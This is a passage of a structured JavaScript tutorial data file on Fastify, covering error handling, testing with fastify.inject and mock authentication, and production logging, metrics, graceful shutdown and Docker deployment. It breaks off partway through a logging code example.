     - Throwing ResourceNotFoundError → 404 response
     - DB unique constraint violation (23505) → 409 response (not 500)
     - Unknown error in production → 500 with 'Internal Server Error' (no stack)
    `,
    summary: `Fastify error handling is centralized in setErrorHandler — a single function that intercepts every thrown error, classifies it (validation? HTTP error? operational? unknown?), logs what's needed server-side, and sends a safe, sanitized response to the client. The production rule is non-negotiable: 5xx errors log full stack traces internally and send only generic messages externally, while 4xx errors send the user-friendly message but never expose schema internals, SQL details, or file paths.`
  },

  {
    id: 9,
    title: "Testing Fastify Applications",
    tag: "FAST, ISOLATED, AND RELIABLE API TESTS WITHOUT A NETWORK",
    color: "#4C1D95",
    tldr: `Fastify's fastify.inject() method sends HTTP requests directly to the Fastify request pipeline without opening a real TCP socket — making tests 10-100× faster than supertest-style network calls. The standard pattern is a createApp() factory function that builds the full server instance (with plugins, routes, and decorators) which is reused in tests. Auth can be bypassed by replacing the authenticate decorator with a no-op, enabling isolated unit testing of route logic.`,
    problem: `
WHY THIS CONCEPT EXISTS / WHAT CONFUSION IT SOLVES:
----------------------------------------------------
"How do I test Fastify routes without starting a real server on a port?"
  → fastify.inject({ method: 'GET', url: '/users/1', headers: {...} })
  → Internally routes the request through the full Fastify pipeline (hooks, validation, handler).
  → No TCP. No port. No timing issues. No 'address already in use' errors.
  → Returns a full response object: { statusCode, headers, body, json() }.

"My tests are slow because each test creates a new database connection"
  → Test factory: create one Fastify instance per test file (not per test case).
  → Use beforeAll()/afterAll() to build and close the server once per file.
  → For isolation between tests: use database transactions and rollback after each test.
    Or: use a test database seeded with known fixtures.

"How do I test protected routes without having a real JWT token?"
  → Override the authenticate decorator before registering route plugins.
  → In test setup: fastify.decorate('authenticate', async (req) => { req.user = mockUser; })
  → Routes that call fastify.authenticate get the no-op that injects a mock user.
  → No real JWT needed. No need to call /auth/login to get a token for every test.

"Should I use a real database or mock the database in tests?"
  → Real database (recommended): use a test database with migrations applied.
    Catches actual SQL bugs, constraint violations, query performance issues.
    Use transaction rollback to keep tests isolated.
  → Mock database (simpler): replace fastify.db with mock functions.
    Faster. No DB setup. But: doesn't catch SQL bugs, schema mismatches.
  → Hybrid: real DB for integration tests, mock for unit tests of specific handlers.

"What's wrong with using supertest for Fastify?"
  → supertest opens a real TCP connection to a running server.
  → Fastify.inject(): no network at all. No port allocation. No EADDRINUSE.
  → fastify.inject() is 10-100× faster than supertest for Fastify apps.
  → supertest works but inject() is the Fastify-idiomatic approach.
    `,
    analogy: `
THE SIMULATOR vs REAL FLIGHT ANALOGY:
---------------------------------------
TESTING WITH SUPERTEST (NETWORK) = TEST FLIGHTS WITH REAL PLANES:
  Want to test autopilot? Fuel an actual plane, taxi to runway, take off.
  Cost: fuel, runway time, real weather, real ATC communication.
  Slow. Expensive. One test = one real flight.
  
  Supertest equivalent: start a real server, bind to port, make HTTP requests over TCP.
  Cost: port allocation, TCP handshake, OS networking stack, potential port conflicts.

TESTING WITH FASTIFY.INJECT() = FLIGHT SIMULATOR:
  Same autopilot software runs. Same controls. Same response.
  No actual airplane. No fuel. No runway. No weather.
  100 simulated flights per second. Zero infrastructure.
  
  fastify.inject({ method: 'GET', url: '/flights/42' })
  → Same Fastify pipeline runs: hooks, validation, handler, serialization.
  → No TCP socket. No port. Response returned directly as an object.
  → Test 100 routes in the time supertest tests 1.

CREATEAPP() FACTORY = THE SIMULATOR CONFIGURATION LOADER:
  Each test needs the full server (with db plugin, auth plugin, routes).
  Without factory: either restart simulator for each test (slow) or share state (unreliable).
  
  With factory: createApp() returns a fresh simulator with:
    - Real plugins (db, auth) — OR mock plugins for unit tests.
    - All routes registered.
    - Ready for inject() calls.
  
  In tests:
    const app = createApp(); // Clean simulator
    await app.ready();       // All plugins loaded
    const res = await app.inject({ method: 'GET', url: '/test' });
    await app.close();       // Shut down simulator

MOCK AUTHENTICATE = THE TRAINING BADGE:
  Testing a flight attendant's emergency procedures. They need a pilot badge to enter.
  For training: issue a training badge (mock authenticate) that looks real but
  is stamped "TRAINING — NOT FOR REAL FLIGHTS."
  
  In test setup:
    app.decorate('authenticate', async (req) => { req.user = { sub: '42', role: 'admin' }; })
  
  The flight attendant (route handler) enters, does their procedure.
  Procedure tested correctly. No real pilot authentication needed.
  Real badge (JWT verification) only used in production flights.
    `,
    deep: `
DEEP TECHNICAL BREAKDOWN — FASTIFY TESTING INTERNALS:
-----------------------------------------------------

FASTIFY.INJECT() INTERNALS:
  inject() creates a fake IncomingMessage and ServerResponse.
  Routes the request through:
    1. Fastify's route matching (find-my-way trie lookup).
    2. All lifecycle hooks (onRequest → onResponse).
    3. Schema validation.
    4. Route handler.
    5. Schema serialization.
  
  Returns LightMyRequest response:
    { statusCode, headers, body, json(), payload, rawPayload, trailers }
  
  .json() helper: parses body as JSON. Throws if invalid JSON.
  .body: the raw body string.
  .rawPayload: Buffer of the response.
  
  Full inject options:
    fastify.inject({
      method: 'POST',
      url: '/users',
      headers: { 'content-type': 'application/json', 'authorization': 'Bearer ...' },
      payload: JSON.stringify({ email: 'test@test.com' }),  // OR:
      body: { email: 'test@test.com' },    // inject() auto-stringifies + sets content-type
      query: { page: '1', limit: '20' },   // Query string params
      cookies: { authToken: 'jwt-value' }  // Cookie header
    });

TEST FACTORY PATTERN:
  // test/helpers/createApp.js
  // const buildApp = require('../../src/app');
  //
  // async function createApp(opts = {}) {
  //   const app = buildApp({
  //     logger: false,  // Quiet logs in tests
  //     ...opts
  //   });
  //
  //   // Override db with test database (or mock):
  //   if (opts.mockDb) {
  //     app.decorate('db', opts.mockDb);
  //   }
  //
  //   // Override authenticate for protected route tests:
  //   if (opts.mockUser) {
  //     app.decorateRequest('user', null);
  //     app.decorate('authenticate', async (req) => { req.user = opts.mockUser; });
  //   }
  //
  //   await app.ready(); // Wait for all plugins to load
  //   return app;
  // }
  //
  // module.exports = { createApp };

DATABASE ISOLATION STRATEGIES:
  Strategy 1 — Transaction rollback (best for integration tests):
    beforeEach: BEGIN TRANSACTION → seed test data
    test: run queries
    afterEach: ROLLBACK → clean state
    
    // Using pg client directly:
    let client;
    beforeEach(async () => {
      client = await pool.connect();
      await client.query('BEGIN');
      app.decorate('db', drizzle(client)); // Use transaction connection
    });
    afterEach(async () => {
      await client.query('ROLLBACK');
      client.release();
    });
  
  Strategy 2 — Truncate tables between tests:
    afterEach: DELETE FROM orders; DELETE FROM users; etc.
    Slower than rollback but simpler setup.
  
  Strategy 3 — Separate test database:
    DATABASE_URL=postgres://localhost/myapp_test
    Migrate once. Truncate/seed before each test file.

MOCKING SPECIFIC METHODS:
  For unit tests of specific handlers without full DB setup:
  
  const mockDb = {
    query: {
      users: {
        findFirst: jest.fn().mockResolvedValue({ id: 42, name: 'Priya', email: 'p@test.com' }),
        findMany: jest.fn().mockResolvedValue([])
      }
    },
    insert: jest.fn().mockReturnValue({
      values: jest.fn().mockReturnValue({
        returning: jest.fn().mockResolvedValue([{ id: 1 }])
      })
    })
  };
  
  const app = await createApp({ mockDb });
  // All fastify.db calls use mockDb. No real database needed.

TESTING EDGE CASES AND ERROR PATHS:
  1. Validation errors: send invalid body → expect 400 + field errors.
  2. Auth failures: no token → expect 401.
  3. Not found: request non-existent resource → expect 404.
  4. Conflict: create duplicate → expect 409.
  5. DB errors: mockDb.query.throw(new Error('DB down')) → expect 503.
  
  Testing validation:
    const res = await app.inject({ method: 'POST', url: '/users', body: {} }); // Empty body
    expect(res.statusCode).toBe(400);
    const json = res.json();
    expect(json.error).toBe('Validation Error');
    expect(json.fields.some(f => f.field === 'email')).toBe(true);
    `,
    code: `
// ===== TESTING FASTIFY APPLICATIONS — EXAMPLES =====

// EXAMPLE 1: Basic test setup with fastify.inject()

// // test/routes/users.test.js
// const { createTestApp } = require('../helpers/createApp');
//
// describe('User Routes', () => {
//   let app;
//
//   beforeAll(async () => {
//     app = await createTestApp({
//       mockUser: { sub: '1', email: 'priya@test.com', role: 'user', tenantId: 1 }
//     });
//   });
//
//   afterAll(async () => {
//     await app.close();
//   });
//
//   test('GET /users/me returns current user', async () => {
//     const res = await app.inject({
//       method: 'GET',
//       url: '/users/me',
//       headers: { authorization: 'Bearer any-token-mock-ignores-it' }
//     });
//
//     expect(res.statusCode).toBe(200);
//     const body = res.json();
//     expect(body.email).toBe('priya@test.com');
//     expect(body.passwordHash).toBeUndefined(); // Response schema strips it
//   });
//
//   test('GET /users/me without auth returns 401', async () => {
//     // Create app WITHOUT mock auth to test real auth:
//     const realAuthApp = await createTestApp(); // No mockUser
//     const res = await realAuthApp.inject({ method: 'GET', url: '/users/me' });
//     expect(res.statusCode).toBe(401);
//     await realAuthApp.close();
//   });
// });

// EXAMPLE 2: Test app factory

// // test/helpers/createApp.js
// // const Fastify = require('fastify');
// // const fp = require('fastify-plugin');
//
// async function createTestApp(opts = {}) {
//   const app = Fastify({ logger: false }); // Silent logs in tests
//
//   // Config plugin (real):
//   app.decorate('config', {
//     env: 'test',
//     jwtSecret: 'test-secret-not-for-production',
//     databaseUrl: process.env.TEST_DATABASE_URL
//   });
//
//   // Database: real test DB or mock:
//   if (opts.mockDb) {
//     app.register(fp(async (f) => { f.decorate('db', opts.mockDb); }));
//   } else {
//     app.register(require('../../src/plugins/database'));
//   }
//
//   // Auth: real or mock:
//   if (opts.mockUser) {
//     app.decorateRequest('user', null);
//     app.register(fp(async (f) => {
//       f.decorate('authenticate', async (req) => {
//         req.user = opts.mockUser; // Inject mock user, no JWT needed
//       });
//     }));
//   } else {
//     app.register(require('../../src/plugins/auth'));
//   }
//
//   // All routes:
//   app.register(require('../../src/routes'), { prefix: '/api/v1' });
//
//   await app.ready();
//   return app;
// }
//
// module.exports = { createTestApp };

// EXAMPLE 3: Integration test with real database and transaction rollback

// // test/integration/orders.test.js
// const { Pool } = require('pg');
// const { drizzle } = require('drizzle-orm/node-postgres');
//
// describe('Order Integration Tests', () => {
//   let app, pool, client;
//
//   beforeAll(async () => {
//     pool = new Pool({ connectionString: process.env.TEST_DATABASE_URL });
//   });
//
//   afterAll(async () => {
//     await pool.end();
//   });
//
//   beforeEach(async () => {
//     client = await pool.connect();
//     await client.query('BEGIN'); // Start transaction
//     const db = drizzle(client, { schema }); // DB uses transaction connection
//     app = await createTestApp({ mockDb: db, mockUser: { sub: '1', role: 'customer' } });
//   });
//
//   afterEach(async () => {
//     await client.query('ROLLBACK'); // Undo all test data
//     client.release();
//     await app.close();
//   });
//
//   test('POST /orders creates order and items', async () => {
//     // Seed test data within the transaction:
//     await client.query("INSERT INTO products (id, name, price, stock) VALUES (1, 'Test Product', 100, 10)");
//
//     const res = await app.inject({
//       method: 'POST',
//       url: '/api/v1/orders',
//       body: { items: [{ productId: 1, quantity: 2, price: 100 }] }
//     });
//
//     expect(res.statusCode).toBe(201);
//     const order = res.json();
//     expect(order.totalAmount).toBe(200);
//     expect(order.status).toBe('pending');
//
//     // Verify stock was decremented:
//     const { rows } = await client.query('SELECT stock FROM products WHERE id = 1');
//     expect(rows[0].stock).toBe(8); // 10 - 2
//   }); // afterEach: ROLLBACK — all test data gone
// });

// EXAMPLE 4: Schema/response shape testing

// test('GET /products response shape', async () => {
//   const res = await app.inject({ method: 'GET', url: '/api/v1/products?limit=5' });
//   expect(res.statusCode).toBe(200);
//   const body = res.json();
//
//   // Shape tests:
//   expect(body).toHaveProperty('items');
//   expect(body).toHaveProperty('nextCursor');
//   expect(Array.isArray(body.items)).toBe(true);
//
//   if (body.items.length > 0) {
//     const product = body.items[0];
//     // Must have these fields:
//     expect(product).toHaveProperty('id');
//     expect(product).toHaveProperty('name');
//     expect(product).toHaveProperty('price');
//     // Must NOT have internal fields (response schema strips them):
//     expect(product).not.toHaveProperty('costPrice');
//     expect(product).not.toHaveProperty('supplierId');
//     expect(product).not.toHaveProperty('internalNotes');
//   }
// });

// EXAMPLE 5: Testing validation errors

// describe('Validation', () => {
//   test('POST /products with missing required fields returns 400', async () => {
//     const res = await app.inject({
//       method: 'POST',
//       url: '/api/v1/products',
//       body: { name: 'TV' } // Missing: price, stock, categoryId
//     });
//     expect(res.statusCode).toBe(400);
//     const body = res.json();
//     expect(body.error).toBe('Validation Error');
//     expect(body.fields).toEqual(
//       expect.arrayContaining([
//         expect.objectContaining({ field: 'price' }),
//         expect.objectContaining({ field: 'stock' })
//       ])
//     );
//   });
//
//   test('POST /products with negative price returns 400', async () => {
//     const res = await app.inject({
//       method: 'POST',
//       url: '/api/v1/products',
//       body: { name: 'TV', price: -100, stock: 5, categoryId: 1 }
//     });
//     expect(res.statusCode).toBe(400);
//     const field = res.json().fields?.find(f => f.field === 'price');
//     expect(field).toBeDefined();
//   });
// });

// EXAMPLE 6: Testing with JWT in header (real auth flow)

// test('Full auth flow: login → protected route', async () => {
//   const realApp = await createTestApp(); // No mock auth
//
//   // Register a test user:
//   const registerRes = await realApp.inject({
//     method: 'POST', url: '/auth/register',
//     body: { email: 'test@test.com', password: 'SecurePass123!', name: 'Test User' }
//   });
//   expect(registerRes.statusCode).toBe(201);
//
//   // Login:
//   const loginRes = await realApp.inject({
//     method: 'POST', url: '/auth/login',
//     body: { email: 'test@test.com', password: 'SecurePass123!' }
//   });
//   expect(loginRes.statusCode).toBe(200);
//   const { accessToken } = loginRes.json();
//
//   // Access protected route:
//   const profileRes = await realApp.inject({
//     method: 'GET', url: '/users/me',
//     headers: { authorization: \`Bearer \${accessToken}\` }
//   });
//   expect(profileRes.statusCode).toBe(200);
//   expect(profileRes.json().email).toBe('test@test.com');
//
//   await realApp.close();
// });

// EXAMPLE 7: Testing with mock db — unit test approach

// const mockDb = {
//   query: {
//     products: {
//       findMany: jest.fn(),
//       findFirst: jest.fn()
//     }
//   }
// };
//
// beforeEach(() => {
//   jest.clearAllMocks();
// });
//
// test('GET /products returns products from DB', async () => {
//   const fakeProducts = [
//     { id: 1, name: 'Phone', price: '25000', stock: 10, isActive: true },
//     { id: 2, name: 'Tablet', price: '45000', stock: 5, isActive: true }
//   ];
//   mockDb.query.products.findMany.mockResolvedValue(fakeProducts);
//
//   const res = await app.inject({ method: 'GET', url: '/products' });
//   expect(res.statusCode).toBe(200);
//   expect(res.json().items).toHaveLength(2);
//   expect(mockDb.query.products.findMany).toHaveBeenCalledTimes(1);
// });
//
// test('GET /products/:id returns 404 for unknown product', async () => {
//   mockDb.query.products.findFirst.mockResolvedValue(null);
//   const res = await app.inject({ method: 'GET', url: '/products/999' });
//   expect(res.statusCode).toBe(404);
// });
    `,
    bugs: `
REAL PRODUCTION BUGS FOUND THROUGH TESTING (AND TESTING MISTAKES):
------------------------------------------------------------------

BUG 1: Tests not closing the app — port leak and test suite hangs
  Scenario: Tests created Fastify instances but didn't close them:
    describe('Users', () => {
      let app;
      beforeAll(async () => { app = await createTestApp(); });
      // Missing: afterAll(() => app.close())
    });
    After 50 test files: 50 Fastify instances still "running."
    Test suite: never exited (process.exit not called — open handles).
    Jest --forceExit masked the issue. Real problem: resource leaks.
  Fix: Always close the app in afterAll:
    afterAll(async () => { await app.close(); });
    For database connections: await pool.end() as well.
    Use jest --detectOpenHandles to find unclosed resources.

BUG 2: Sharing app instance across test files — test pollution
  Scenario: app created once at module level (not in beforeAll):
    const app = await createTestApp(); // At module level, runs once
    
    Test A: creates user with email 'test@test.com'.
    Test B: tries to create same user → conflict! Test B fails randomly.
    Tests pass when run individually. Fail when run together.
  Root cause: Shared app = shared DB state. No isolation between tests.
  Fix: Create fresh app (and fresh DB transaction) per test or per test file.
    Use beforeEach for maximum isolation (slower but reliable).
    Use beforeAll + transaction rollback for balance of speed and isolation.

BUG 3: Mock authenticate not applied before route plugin — real auth runs
  Scenario: Test factory:
    app.register(authPlugin);          // Registers real authenticate decorator
    app.decorate('authenticate', mockFn); // Too late! FST_ERR_DEC_ALREADY_PRESENT
    
    FST_ERR_DEC_ALREADY_PRESENT: 'authenticate' already registered by authPlugin.
    Test setup crashed. Mock never applied.
  Root cause: Decorators must be registered once. Can't override with decorate().
  Fix options:
    1. Register mock BEFORE authPlugin, skip authPlugin in test mode:
       if (opts.mockUser) {
         app.decorateRequest('user', null);
         app.decorate('authenticate', mockAuth);
         // Don't register authPlugin
       } else {
         app.register(authPlugin);
       }
    2. Check before decorating: if (!app.hasDecorator('authenticate')) app.decorate(...)
    3. Use dependency injection: pass auth strategy as option to the app builder.

BUG 4: Testing with inject() but not calling await app.ready() — routes not registered
  Scenario: Test without await app.ready():
    const app = Fastify();
    app.register(routes);
    // Missing: await app.ready();
    const res = await app.inject({ method: 'GET', url: '/users' });
    expect(res.statusCode).toBe(200); // FAILS: statusCode is 404!
    
    Routes registered but Fastify not "ready" — routes not yet in the trie.
    inject() before ready: routes not found → 404.
  Root cause: Plugin registration is async. Routes added to trie only after ready().
  Fix: Always await app.ready() before inject():
    await app.ready();
    const res = await app.inject(...);

BUG 5: Testing validation but not checking the full field path
  Scenario: Validation test:
    test('missing email returns 400', async () => {
      const res = await app.inject({ method: 'POST', url: '/register', body: {} });
      expect(res.statusCode).toBe(400); // ✓ passes
    });
    
    But the REAL error: wrong AJV error mapping in setErrorHandler strips too much.
    The field path was '/body/user/email' (nested). Stripping '/body/' gave 'user/email'.
    Should give: 'user.email'. Client got: 'user/email' (wrong separator).
    Frontend: couldn't highlight the right input field. UX broken.
  Root cause: Test only checked statusCode, not the field error format.
  Fix: Test the full error response structure:
    expect(res.json().fields[0].field).toBe('email'); // Check exact field name
    // For nested: 'user.email', not 'user/email'
    `,
    challenge: `
CHALLENGES:
-----------

CHALLENGE 1 — PREDICT THE TEST BEHAVIOR:
  Given this test:

  let app;
  beforeAll(async () => {
    app = Fastify({ logger: false });
    app.decorateRequest('user', null);
    app.decorate('authenticate', async (req) => {
      req.user = { sub: '42', role: 'admin', tenantId: 1 };
    });
    app.register(require('./routes/orders'), { prefix: '/orders' });
    // Note: await app.ready() is NOT called here
  });
  afterAll(() => app.close());

  test('GET /orders returns orders', async () => {
    const res = await app.inject({ method: 'GET', url: '/orders' });
    expect(res.statusCode).toBe(200);
  });

  a) Does this test pass? If not, what is the likely statusCode and why?
  b) What needs to be added/changed to make it pass?
  c) If orders routes have: preHandler: [fastify.authenticate], does the mock authenticate run?
  d) What happens if you add a second test in the same file that also calls app.inject()?
     Does it need its own setup?

CHALLENGE 2 — FIX THE TEST BUGS:
  This test file has 3 bugs. Find and fix each.

  // Bug 1: No app.close() — resource leak
  describe('Product tests', () => {
    let app;
    beforeAll(async () => {
      app = await createTestApp();
      await app.ready();
    });
    // Missing afterAll!

    test('GET /products', async () => {
      const res = await app.inject({ method: 'GET', url: '/products' });
      expect(res.statusCode).toBe(200);
    });
  });

  // Bug 2: Checking response.body instead of response.json()
  test('POST /users', async () => {
    const res = await app.inject({ method: 'POST', url: '/users',
      body: { email: 'test@test.com', name: 'Test', password: 'Pass123!' }
    });
    expect(res.statusCode).toBe(201);
    expect(res.body.email).toBe('test@test.com'); // Bug: body is a string, not object!
  });

  // Bug 3: Shared state between tests — email conflict
  describe('User creation', () => {
    test('creates user Priya', async () => {
      const res = await app.inject({ method: 'POST', url: '/users',
        body: { email: 'priya@test.com', name: 'Priya', password: 'Pass!' }
      });
      expect(res.statusCode).toBe(201);
    });

    test('creates user Rohan', async () => {
      const res = await app.inject({ method: 'POST', url: '/users',
        body: { email: 'priya@test.com', name: 'Rohan', password: 'Pass!' } // Same email!
      });
      expect(res.statusCode).toBe(201); // Will this pass?
    });
  });

CHALLENGE 3 — BUILD FROM SCRATCH:
  Build a complete test suite for a wallet/payments feature.

  Routes to test:
  - GET /wallet/balance → returns { balance, currency }
  - POST /wallet/add-funds → adds funds (body: { amount })
  - POST /wallet/transfer → transfers to another user (body: { toUserId, amount })
  - GET /wallet/transactions → paginated transaction history

  Test requirements:
  1. createTestApp() factory with:
     - Mock DB option (for unit tests)
     - Real DB with transaction rollback (for integration tests)
     - Mock authenticate with configurable user ({ sub, role, tenantId })

  2. Unit tests using mock DB:
     - Balance returns 0 for new user
     - add-funds with negative amount returns 400
     - transfer with insufficient balance returns 409

  3. Integration tests with real DB:
     - Full transfer flow: user A balance decremented, user B balance incremented (same transaction)
     - Verify transaction history records the transfer
     - Concurrent transfers don't cause double-spend (use two inject() calls in parallel)

  4. Auth tests:
     - All routes return 401 without token (use real auth, not mock)
     - /wallet/transactions returns only current user's transactions (not all users')
    `,
    summary: `Fastify testing is fast and reliable because fastify.inject() bypasses the network entirely while still exercising the full request pipeline. The createTestApp() factory pattern combined with transaction rollback for database isolation gives you tests that are fast (no port, no network), independent (each test gets a clean state), and realistic (real SQL queries, real validation, real hooks). Bypassing authentication with mock decorators keeps tests focused on route logic without the noise of JWT token management.`
  },

  {
    id: 10,
    title: "Production: Logging, Metrics & Deployment",
    tag: "FROM LOCAL DEV TO A RESILIENT, OBSERVABLE PRODUCTION SERVER",
    color: "#92400E",
    tldr: `Fastify's built-in pino logger produces structured JSON logs with nanosecond-precision timestamps and automatic request/response correlation — ideal for log aggregation systems. Production deployment requires graceful shutdown (listening for SIGTERM before calling fastify.close()), environment-validated config (@fastify/env), Prometheus metrics (@fastify/metrics), and a Docker multi-stage build that produces a small, secure, non-root image.`,
    problem: `
WHY THIS CONCEPT EXISTS / WHAT CONFUSION IT SOLVES:
----------------------------------------------------
"My logs are a mix of console.log strings — hard to search and filter in production"
  → pino (Fastify's built-in logger) outputs structured JSON: { level, time, reqId, msg, ...data }
  → Every log line is a parseable JSON object. Filter by reqId, level, userId in CloudWatch/Datadog.
  → Automatic request logs: each request logs method, url, statusCode, responseTime.
  → request.log.info({ userId: 42 }, 'Order created') — correlated to the request's reqId.

"My server receives SIGTERM from Kubernetes but just dies — in-flight requests dropped"
  → Kubernetes: sends SIGTERM before stopping a pod. Gives the app 30s to finish.
  → Without handler: Node process exits immediately. In-flight requests: aborted. Data loss.
  → With SIGTERM handler: fastify.close() starts graceful shutdown.
    Stop accepting new requests → finish in-flight requests → close connections → exit.

"My app uses process.env directly everywhere — typo in a variable name crashes in production"
  → @fastify/env: validates environment variables against a JSON Schema at startup.
  → If MISSING_REQUIRED_VAR is not set → server refuses to start with clear error.
  → Decorated as fastify.config.myVar (typed, autocompleted in TypeScript).
  → No more: if (!process.env.JWT_SECRET) { ... } in every file.

"How do I add Prometheus metrics without writing boilerplate?"
  → @fastify/metrics: registers a /metrics endpoint automatically.
  → Tracks: request count, response time histogram, error count — all labeled by route + status.
  → Works with Prometheus scraping, Grafana dashboards out of the box.

"My Docker image is 1.5GB — how do I shrink it for faster deployments?"
  → Multi-stage build: build stage (node:20) installs devDependencies, compiles TypeScript.
  → Production stage (node:20-alpine): copies only the compiled output + node_modules (without devDeps).
  → Alpine base: ~5MB vs Ubuntu ~80MB. Final image: 150-200MB instead of 1.5GB.
    `,
    analogy: `
THE AIR TRAFFIC CONTROL ANALOGY:
----------------------------------
PINO STRUCTURED LOGGING = THE FLIGHT DATA RECORDER:
  Old approach: pilot (developer) shouts status updates over intercom (console.log).
  "Something happened around 3pm! I think it was flight AK-42 but not sure!"
  Unstructured. Hard to correlate. Can't be searched automatically.
  
  pino: every event recorded in the flight data recorder (structured JSON).
  { "time": "2024-01-15T14:32:17.432Z", "reqId": "AK-42", "level": "info",
    "statusCode": 200, "url": "/orders/checkout", "responseTime": 45.2, "userId": 999 }
  
  ATC (log aggregation system): can instantly find ALL events for flight AK-42.
  Filter: "show me all 500 errors in the last hour" → SQL-like query on structured data.

SIGTERM + GRACEFUL SHUTDOWN = CONTROLLED RUNWAY CLEARING:
  Plane (server) is landing. ATC says: "Prepare for shutdown in 30 seconds."
  
  Without SIGTERM handler: plane instantly stops. Passengers (requests) mid-aisle, luggage scattered.
  
  With graceful shutdown:
  1. Stop new planes from landing (stop accepting new connections).
  2. Current passengers deplane (finish in-flight requests).
  3. Crew secures the aircraft (close DB connections, flush logs).
  4. Aircraft taxies to hangar (process.exit(0)).
  
  Kubernetes: sends SIGTERM → waits terminationGracePeriodSeconds (default 30s) → SIGKILL.
  Your server must finish graceful shutdown BEFORE the 30s window.

@FASTIFY/ENV = THE PRE-FLIGHT CHECKLIST:
  Before taking off: "Is fuel loaded? Is navigation system configured? Is radio frequency set?"
  If any item missing: plane doesn't leave the gate. Clear error.
  
  @fastify/env: at startup, validates ALL required environment variables.
  If JWT_SECRET not set: "Configuration error: JWT_SECRET is required" → server doesn't start.
  Better to fail at gate (startup) than to crash mid-flight (runtime).

PROMETHEUS + GRAFANA = THE AIR TRAFFIC DASHBOARD:
  Live dashboard at ATC: "How many flights are in the air? Average landing time? Error rate?"
  
  @fastify/metrics → /metrics endpoint:
  http_requests_total{method="POST",route="/orders",status="201"} 4521
  http_request_duration_seconds{route="/products",quantile="0.99"} 0.045
  
  Prometheus scrapes /metrics every 15s → stores time series data.
  Grafana: queries Prometheus → live charts, alerts on anomalies.
  "Response time for /checkout just spiked to 3s" → alert fires → engineer paged.

DOCKER MULTI-STAGE = THE FACTORY FLOOR AND RETAIL PACKAGING:
  Factory floor: full production environment. Heavy machinery. Workers with tools.
    → node:20 with all build tools, TypeScript compiler, devDependencies.
  
  Retail shelf: only the final product. No machinery needed.
    → node:20-alpine with only the compiled app + production dependencies.
  
  Without multi-stage: ship the entire factory to the customer.
  With multi-stage: ship only the product. Factory stays at the factory.
    `,
    deep: `
DEEP TECHNICAL BREAKDOWN — PRODUCTION FASTIFY INTERNALS:
--------------------------------------------------------

PINO LOGGER INTERNALS:
  pino is Fastify's built-in logger. It's 5-10× faster than winston because:
  1. Minimal JSON serialization — no template strings, direct property access.
  2. Async I/O — writes to stdout asynchronously (non-blocking).
  3. No unnecessary work — only serializes what's needed for the log level.
  
  Log levels (numeric): trace=10, debug=20, info=30, warn=40, error=50, fatal=60.
  In production: level='warn' or 'info'. In development: level='debug'.
  
  request.log vs fastify.log:
    fastify.log: server-level logs (startup, shutdown, plugin registration).
    request.log: bound to the current request's reqId. Automatic correlation.
  
  Redaction (remove sensitive fields from logs):
    fastify = Fastify({
      logger: {
        redact: {
          paths: ['req.headers.authorization', 'body.password', 'body.cardNumber'],
          censor: '[REDACTED]'   // Replace value with this string
        }
      }
    });
    Even if you accidentally log request.body: password field shows as [REDACTED].
  
  Serializers (customize how objects are logged):
    fastify = Fastify({
      logger: {
        serializers: {
          req(req) { return { method: req.method, url: req.url, id: req.id }; }
          // Don't log full request (body, headers) by default — PII risk
        }
      }
    });

GRACEFUL SHUTDOWN COMPLETE PATTERN:
  Process: SIGTERM received → stop accepting → drain requests → close → exit
  
  let isShuttingDown = false;
  
  process.on('SIGTERM', async () => {
    fastify.log.info('SIGTERM received — starting graceful shutdown');
    isShuttingDown = true;
    
    try {
      await fastify.close(); // Stops server + fires onClose hooks
      fastify.log.info('Server closed successfully');
      process.exit(0);
    } catch (err) {
      fastify.log.error({ err }, 'Error during shutdown');
      process.exit(1);
    }
  });
  
  // Optional: reject new requests during shutdown:
  fastify.addHook('onRequest', async (request, reply) => {
    if (isShuttingDown) {
      reply.status(503).header('Connection', 'close').send({ error: 'Server shutting down' });
    }
  });
  
  // SIGINT (Ctrl+C in development):
  process.on('SIGINT', () => process.emit('SIGTERM'));

@FASTIFY/ENV CONFIGURATION:
  // plugins/config.js
  // const fp = require('fastify-plugin');
  // const schema = {
  //   type: 'object',
  //   required: ['DATABASE_URL', 'JWT_SECRET', 'PORT'],
  //   properties: {
  //     NODE_ENV: { type: 'string', default: 'development', enum: ['development','test','production'] },
  //     PORT: { type: 'integer', default: 3000 },
  //     DATABASE_URL: { type: 'string' },
  //     JWT_SECRET: { type: 'string', minLength: 32 },
  //     REDIS_URL: { type: 'string', default: 'redis://localhost:6379' },
  //     LOG_LEVEL: { type: 'string', default: 'info', enum: ['trace','debug','info','warn','error'] },
  //     CORS_ORIGIN: { type: 'string', default: '*' }
  //   }
  // };
  //
  // module.exports = fp(async function configPlugin(fastify) {
  //   await fastify.register(require('@fastify/env'), {
  //     schema,
  //     dotenv: { path: '.env', override: false }
  //   });
  //   // fastify.config is now decorated with all env vars
  //   // fastify.config.DATABASE_URL, fastify.config.JWT_SECRET, etc.
  // }, { name: 'config' });

PROMETHEUS METRICS WITH @FASTIFY/METRICS:
  Registration:
    fastify.register(require('@fastify/metrics'), {
      endpoint: '/metrics',      // Prometheus scrape endpoint
      routeMetrics: {
        enabled: true,           // Track per-route metrics
        groupStatusCodes: true,  // Group 2xx, 4xx, 5xx
        overrides: {             // Customize metric names
          histogram: { name: 'http_request_duration_seconds' }
        }
      }
    });
  
  Auto-generated metrics:
    http_requests_total{method, route, status_code}
    http_request_duration_seconds{method, route, status_code, quantile}
    http_request_summary_seconds{method, route, status_code, quantile}
    nodejs_heap_size_used_bytes
    nodejs_gc_duration_seconds
  
  Custom metrics:
    const prometheus = require('prom-client');
    const orderCounter = new prometheus.Counter({
      name: 'orders_created_total',
      help: 'Total number of orders created',
      labelNames: ['payment_method', 'status']
    });
    // In route: orderCounter.inc({ payment_method: 'upi', status: 'success' });

DOCKER MULTI-STAGE BUILD:
  Stage 1 (builder): install all deps, compile TypeScript.
  Stage 2 (production): copy compiled output, install only production deps.
  
  Security: non-root user (node user in Alpine).
  Health check: Docker checks /health endpoint every 30s.
  Secrets: environment variables injected at runtime (not in Dockerfile).

CLUSTER MODE:
  Node.js: single-threaded. One process = one CPU core.
  Cluster module: fork N worker processes (N = CPU cores).
  Primary process: distributes requests across workers (round-robin).
  Worker crash: primary restarts it automatically.
  
  In Kubernetes: horizontal pod autoscaling (HPA) scales instances.
  Cluster mode: useful for single-VM deployments without orchestration.
    `,
    code: `
// ===== PRODUCTION: LOGGING, METRICS & DEPLOYMENT — EXAMPLES =====

// EXAMPLE 1: Production Fastify initialization with pino config

// const fastify = Fastify({
//   logger: {
//     level: process.env.LOG_LEVEL || 'info',
//     // Pretty-print in development:
